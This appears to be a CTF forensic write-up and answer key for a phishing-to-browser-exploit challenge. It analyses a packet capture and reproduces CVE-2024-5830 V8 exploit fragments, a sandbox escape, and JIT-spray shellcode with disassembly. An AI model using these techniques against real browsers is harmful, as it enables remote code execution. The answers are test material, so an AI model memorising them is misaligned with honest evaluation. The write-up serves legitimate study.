# Cold Access

## Event: Arctic Howl CTF - OffSec

## Challenge Description

The Cascade Expanse is still frozen, but something beneath the ice has begun to change.

Following a period of growth and modernization, The Cascade NGO Hub deployed a new online platform to support global collaboration and volunteer engagement. The rollout introduced cloud infrastructure, updated services, and expanded partner integrations. Initial checks showed no immediate issues.

Then the cold set in.

Subtle anomalies began appearing across systems -- brief access events, unexpected sessions, and behavior that didn't match human workflows. Nothing overtly malicious. Nothing broken. Yet the environment felt altered. As if something new was pressing against the surface.

After a staff member reported unusual system behavior, the Cascade NGO Hub provided an artifact tied to an alleged client-based initial access event.

**Category:** Network Forensics / Malware Analysis / Browser Exploitation

## Challenge Files

| File | Description |
|------|-------------|
| `initial_access.pcapng` | Network traffic capture (31 MB) |

## Tools Used

- tshark / Wireshark (PCAP analysis)
- Python / Capstone (shellcode disassembly)
- xxd (hex-to-ASCII conversion)

## Progress

- Questions 1-10: Completed (10/10)

---

## Analysis

### Network Overview

The PCAP (`initial_access.pcapng`) captures traffic from the victim machine `192.168.50.107` on the Cascade NGO Hub internal network (`ngo-hub.com`). The capture includes:

| Protocol | Frames | Description |
|----------|--------|-------------|
| QUIC     | 19,708 | Normal HTTPS/3 browsing (Google, OffSec, etc.) |
| TLS      | 4,601  | HTTPS connections to various sites |
| DNS      | 794    | Domain name resolution |
| HTTP     | 12     | Unencrypted HTTP (exploit delivery) |
| POP3     | 35     | Email retrieval |
| ICMP     | 14     | Ping traffic (exploit callback) |

### Phase 1: Phishing Email Delivery

A phishing email was delivered to `enygaard@ngo-hub.com` (Elena) via the internal mail server `192.168.50.108`:

```
Return-Path: ciso@ngohub.com
Received: from attacker01 (login.mcrosoftonline.com [203.0.113.10])
    by mail.ngo-hub.com with ESMTP
    ; Mon, 27 Oct 2025 02:11:19 -0700
From: "ciso@ngohub.com" <ciso@ngohub.com>
To: "enygaard@ngo-hub.com" <enygaard@ngo-hub.com>
Subject: [SIMULATION - LAB ONLY] Mandatory Phishing Training
X-Mailer: sendEmail-1.56
```

**Key indicators of phishing:**
- Spoofed sender: `ciso@ngohub.com` (note: missing hyphen vs. legitimate `ngo-hub.com`)
- Spoofed hostname: `login.mcrosoftonline.com` (typosquat of `login.microsoftonline.com`)
- Source IP: `203.0.113.10` (RFC 5737 documentation range -- attacker infrastructure)
- X-Mailer: `sendEmail-1.56` (command-line email tool, not a corporate mail client)
- Malicious link: `http://34.250.131.104/` disguised as "Start Phishing Training"

The victim retrieved this email via **POP3** (frames 20815-20838) and clicked the link.

### Phase 2: Browser Exploit Delivery

When Elena clicked the link, her browser (Microsoft Edge on Windows 11 23H2) loaded `http://34.250.131.104/` which served a malicious HTML page containing a **V8 JavaScript engine exploit**.

The page was served by `Apache/2.4.65 (Amazon Linux)` with `Content-Length: 6218`.

#### Exploit Architecture (CVE-2024-5830)

The exploit is a multi-stage V8 type confusion attack targeting **CVE-2024-5830**, a type confusion vulnerability in V8's object transition system discovered by Man Yue Mo of GitHub Security Lab. The bug exists in `PrepareForDataProperty`, where calling `Update` on a deprecated map can unexpectedly return a dictionary map instead of a fast map when the transition array is full. This causes confusion between `PropertyArray` and `NameDictionary` internal storage types.

**Stage 1 -- V8 Object Map Transition Confusion:**

```javascript
// WASM GC module sets up heap layout with predictable addresses
var module = new WebAssembly.Module(wasmBuffer);
var instance = new WebAssembly.Instance(module, importObject);
var func = instance.exports.make_array;
func();  // Creates WASM GC array for heap arrangement
```

The exploit then triggers the CVE-2024-5830 type confusion using `__defineGetter__` combined with the object spread operator:

```javascript
x.__defineGetter__("prop", function() {
  // Force map deprecation of y's map
  let obj = {};
  obj.a0 = 1.5;  // Deprecates the shared map
  // Fill transition array to capacity (1024+512 entries)
  for (let i = 0; i < 1024 + 512; i++) {
    let tmp = {};
    tmp.a0 = 1;
    for (let j = 1; j < num; j++) tmp['a' + j] = 1;
    tmp['p' + i] = 1;  // Each creates a new transition
  }
  return 4;
});
var y = {...x};  // CloneObject triggers PrepareForDataProperty
                 // Update() returns dictionary map -> PropertyArray/NameDictionary confusion
```

During the spread operation, `CreateDataProperty` calls `PrepareForDataProperty` which calls `Update` on `y`'s deprecated map. Because the transition array is full (1536 transitions added by the getter), `Update` returns a dictionary map via `Normalize`. The code then writes to a `NameDictionary` using `PropertyArray` offsets, corrupting the `elements` field and enabling OOB access.

```javascript
var corrupted_arr = y.name;  // After MigrateSlowToFast, accesses fake double array
```

**Stage 2 -- V8 Heap Sandbox Escape (DOMRect/AudioBuffer Confusion):**

With OOB read/write within the V8 sandbox, the exploit escapes by swapping embedder fields between a **DOMRect** and an **AudioBuffer**:

```javascript
var domRect = new DOMRect(1.1, 2.3, 3.3, 4.4);
var node = new AudioBuffer({length: 3000, sampleRate: 30000, numberOfChannels: 2});
var channel = node.getChannelData(0);

// Read AudioBuffer channel's embedder field
var channelInstance = read(channelAddr + 0x3c);
// Overwrite DOMRect's embedder with AudioBuffer's embedder
write(rectAddr + 0x10, channelInstance[0], channelInstance[1]);
// Now domRect.x reads/writes the AudioBuffer's backing store pointer
```

The exploit then uses `AudioBuffer.copyFromChannel()` and `copyToChannel()` for arbitrary read/write outside the V8 sandbox, using the DOMRect's properties (x, y, width, height) to set target addresses.

**Stage 3 -- Finding dispatch_table_from_imports:**

The exploit searches through the TrustedCage memory region for the `dispatch_table_from_imports`:

```javascript
function findImportTarget(startAddr) {
  var dispatchMap = 0x1f8d;
  domRect.x = i32tof(startAddr, trustedCage);
  node.copyFromChannel(dstFloat, 0, 0);
  for (let i = 0; i < dstInt.length; i++) {
    if (dstInt[i] === 0x1f8d) { return i; }
  }
}
var startAddr = 0x40600;
```

Once found, the exploit modifies the code entry point of the imported WASM function by adding `0x10e` (`0xe + 0x100`) to redirect execution into the JIT-compiled shellcode constants:

```javascript
intView[0] = intView[0] + 0xe + 0x100;
node.copyToChannel(dst, 0, 0);
exported();  // Calls WASM main -> imported func -> redirected to shellcode
```

**Stage 4 -- JIT Spray Shellcode Execution:**

The shellcode is embedded in WebAssembly `f64.const` instructions using the **JIT spraying** technique. Each 8-byte float constant contains x86-64 instructions followed by a short `jmp` (`0xEB`) to chain fragments across JIT framing bytes:

```
Piece  0: 90 49 83 c4 60 90 eb 1d  ; nop; add r12, 0x60; jmp +0x1d
Piece  1: 65 4d 8b 04 24 90 eb 20  ; mov r8, gs:[r12]; jmp +0x20
Piece  2: 49 8b 78 18 90 90 eb 20  ; mov rdi, [r8+0x18]; jmp +0x20
Piece  3: 48 8b 7f 30 90 90 eb 20  ; mov rdi, [rdi+0x30]; jmp +0x20
Piece  4: 48 8b 3f 48 8b 3f eb 20  ; mov rdi, [rdi]; mov rdi, [rdi]; jmp +0x20
Piece  5: 48 8b 47 10 90 90 eb 20  ; mov rax, [rdi+0x10]; jmp +0x20
Piece  6: 48 05 d0 07 07 00 eb 20  ; add rax, 0x707d0; jmp +0x20
Piece  7: 41 54 90 90 41 54 eb 20  ; push r12; push r12; jmp +0x20
Piece  8: ba 52 02 00 00 90 eb 20  ; mov edx, 0x252; jmp +0x20
Piece  9: 48 01 d1 90 90 90 eb 20  ; add rcx, rdx; jmp +0x20
Piece 10: 48 31 d2 48 ff c2 eb 20  ; xor rdx, rdx; inc rdx; jmp +0x20
Piece 11: c6 41 08 00 90 90 eb 20  ; mov byte [rcx+8], 0; jmp +0x20
Piece 12: 48 83 ec 28 90 90 eb 20  ; sub rsp, 0x28; jmp +0x20
Piece 13: ff d0 90 90 90 90 eb 20  ; call rax; jmp +0x20
Piece 14: ff d0 90 90 90 90 eb 20  ; call rax; jmp +0x20
Piece 15: 70 69 6e 67 20 64 62 00  ; "ping db\0"
```

**Reconstructed shellcode disassembly:**
```asm
nop
add r12, 0x60              ; Adjust r12 for TEB access
mov r8, gs:[r12]           ; Read Thread Environment Block
mov rdi, [r8+0x18]         ; PEB pointer
mov rdi, [rdi+0x30]        ; PEB->Ldr (PEB_LDR_DATA)
mov rdi, [rdi]             ; InLoadOrderModuleList.Flink
mov rdi, [rdi]             ; Second module (kernel32.dll)
mov rax, [rdi+0x10]        ; DllBase
add rax, 0x707d0           ; Offset to WinExec
push r12                   ; Save/align stack
push r12
mov edx, 0x252             ; Offset to command string
add rcx, rdx               ; rcx -> "ping db"
xor rdx, rdx
inc rdx                    ; rdx = 1 (SW_SHOWNORMAL)
mov byte [rcx+0x8], 0x00   ; Null terminate command string
sub rsp, 0x28              ; Shadow space (Windows x64 ABI)
call rax                   ; WinExec("ping db", 1)
call rax                   ; Call again for reliability
; "ping db\0"              ; Command string data
```

### Phase 3: Exploit Confirmation (ICMP Callback)

Immediately after the exploit page was loaded (~frame 20924), ICMP echo requests appear:

| Frame | Time | Source | Destination | Type |
|-------|------|--------|-------------|------|
| 20931 | 59.47s | 192.168.50.107 | 192.168.50.109 | Echo Request |
| 20932 | 59.48s | 192.168.50.109 | 192.168.50.107 | Echo Reply |
| 20935 | 60.49s | 192.168.50.107 | 192.168.50.109 | Echo Request |
| 20936 | 60.49s | 192.168.50.109 | 192.168.50.107 | Echo Reply |
| 21030 | 61.50s | 192.168.50.107 | 192.168.50.109 | Echo Request |
| 21031 | 61.50s | 192.168.50.109 | 192.168.50.107 | Echo Reply |
| 24391 | 62.52s | 192.168.50.107 | 192.168.50.109 | Echo Request |
| 24392 | 62.53s | 192.168.50.109 | 192.168.50.107 | Echo Reply |

The hostname `db` resolved to `192.168.50.109` (internal database server). The successful ICMP replies confirm that `WinExec("ping db", 1)` executed on the victim machine, proving code execution was achieved.

---

## Attack Path Summary

```
[Attacker: 203.0.113.10]
         |
         | SMTP (spoofed as ciso@ngohub.com)
         v
[Mail Server: 192.168.50.108]
         |
         | POP3 (enygaard@ngo-hub.com retrieves email)
         v
[Victim: 192.168.50.107 - Win11 23H2 / Edge Browser]
         |
         | HTTP GET http://34.250.131.104/
         v
[Exploit Server: 34.250.131.104 - Apache/Amazon Linux]
         |
         | HTML + JavaScript (CVE-2024-5830 V8 Type Confusion)
         | -> PropertyArray/NameDictionary confusion -> OOB R/W
         | -> DOMRect/AudioBuffer confusion -> Sandbox escape
         | -> JIT spray shellcode -> WinExec("ping db")
         v
[Victim executes: ping db]
         |
         | ICMP Echo Request
         v
[DB Server: 192.168.50.109] -- confirms code execution
```

---

## Answers

### Q1: What was the initial attack vector used by the adversary, and through which protocol was it delivered?
**Phishing email delivered via SMTP/POP3 (email)**

A spoofed phishing email was sent from `attacker01` masquerading as `ciso@ngohub.com` via SMTP. The victim retrieved it via POP3 from the internal mail server. The email contained a malicious link to a browser exploit page at `http://34.250.131.104/`.

### Q2: What protocol has been used to notify that the exploit was successful?
**ICMP**

The exploit's shellcode executed `ping db`, generating ICMP echo requests from the victim (192.168.50.107) to the internal DB server (192.168.50.109). The successful ping replies served as a simple callback confirming code execution.

### Q3: What CVE is related to this vulnerability?
**CVE-2024-5830**

A type confusion vulnerability in V8's object transition system (Chrome < 126.0.6478.54). The bug is in `PrepareForDataProperty` where `Update` on a deprecated map can return a dictionary map when the transition array is full, causing confusion between `PropertyArray` and `NameDictionary`. Discovered by Man Yue Mo of GitHub Security Lab.

### Q4: Which specific assembly instruction helps enable the execution of the final command string?
**mov byte [rcx+8], 0**

This instruction (opcode `c6 41 08 00`) null-terminates the command string "ping db" in JIT-compiled executable memory. The string is embedded as a `f64.const` immediate in the WASM shellcode, and this instruction ensures it is properly delimited as a C string for `WinExec` to parse correctly.

### Q5: What technique has been used to deliver the final stage of the payload within the exploit?
**JIT spraying (WebAssembly JIT spraying)**

The x86-64 shellcode is encoded as immediate float constants in WebAssembly `f64.const` instructions. When the WASM is JIT-compiled, these constants are placed in executable memory. The exploit hijacks execution flow to jump into the JIT-compiled constants, using short `jmp` instructions (`0xEB`) to chain them across JIT framing bytes.

### Q6: Which custom or native function has been called to execute the final command in the exploit?
**WinExec**

The shellcode resolves `WinExec` by traversing TEB -> PEB -> PEB_LDR_DATA -> InLoadOrderModuleList to find kernel32.dll's base address, then adding offset `0x707d0`. It is called via `call rax` (0xFF 0xD0) with RCX pointing to "ping db" and RDX = 1 (SW_SHOWNORMAL).

### Q7: What is the full command executed at the end of the exploit?
**ping db**

The command string `ping db\0` (hex: `70 69 6e 67 20 64 62 00`) is stored in the last `f64.const` of the shellcode. The hostname `db` resolves to the internal database server at `192.168.50.109`.

### Q8: What is the value of the offset added to a register in order to retrieve the command string? (in hex)
**0x252**

The instruction `mov edx, 0x252` (hex: `BA 52 02 00 00`) loads the offset, then `add rcx, rdx` computes the address of the command string relative to the current code base address in JIT-compiled memory.

### Q9: Which structure/location does the exploit search to find the import/dispatch table?
**dispatch_table_from_imports**

The `findImportTarget()` function scans through memory in the TrustedCage starting at offset `0x40600`, searching for the map marker value `0x1f8d` which identifies the `dispatch_table_from_imports` within `WasmTrustedInstanceData`. Once located, the exploit modifies the code entry point to redirect execution into the JIT-sprayed shellcode.

### Q10: Which two V8/DOM object types does the exploit confuse?
**DOMRect and AudioBuffer**

The exploit swaps the embedder field of a `DOMRect` object with the embedder field derived from an `AudioBuffer` (via `AudioBuffer.getChannelData(0)`). This causes `domRect.x` to read/write the AudioBuffer's backing store pointer (`raw_base_addr_`), and `AudioBuffer.copyFromChannel()`/`copyToChannel()` provide arbitrary read/write to the entire process memory space, escaping the V8 heap sandbox.

---

## Key Takeaways

1. **CVE-2024-5830** demonstrates how V8's map transition system can be abused when `PrepareForDataProperty` receives an unexpected dictionary map from `Update`, causing `PropertyArray`/`NameDictionary` confusion
2. **JIT spraying** remains an effective technique for embedding shellcode in browser environments by abusing JIT-compiled float constants in WebAssembly
3. The V8 heap sandbox provides defense-in-depth, but can be bypassed via **DOM object type confusion** (DOMRect/AudioBuffer embedder field swapping) to achieve arbitrary R/W outside the sandbox
4. **PEB walking** is a classic Windows shellcode technique for resolving API functions (WinExec) without imports
5. Simple protocols like **ICMP** (ping) can be used as out-of-band confirmation channels for exploit success
6. Phishing remains the most common initial access vector -- the attacker used typosquatting (`mcrosoftonline.com`) and authority impersonation (CISO)
7. The `mov byte [rcx+8], 0` instruction highlights the importance of null-termination in shellcode that passes strings to Windows API functions

## References

- [CVE-2024-5830 - Type Confusion in V8](https://nvd.nist.gov/vuln/detail/CVE-2024-5830)
- [From object transition to RCE in the Chrome renderer (GitHub Security Lab)](https://github.blog/security/vulnerability-research/from-object-transition-to-rce-in-the-chrome-renderer/)
- [GHSL-2024-XXX Advisory](https://github.com/advisories/GHSA-fchp-8m28-g68f)
- [Chromium Bug 342456991](https://issues.chromium.org/issues/342456991)
- [V8 Heap Sandbox](https://v8.dev/blog/sandbox)
- [WebAssembly GC Proposal](https://github.com/WebAssembly/gc)

---

*Challenge from OffSec Arctic Howl Event - Cold Access*
*Completed: 10/10 questions*
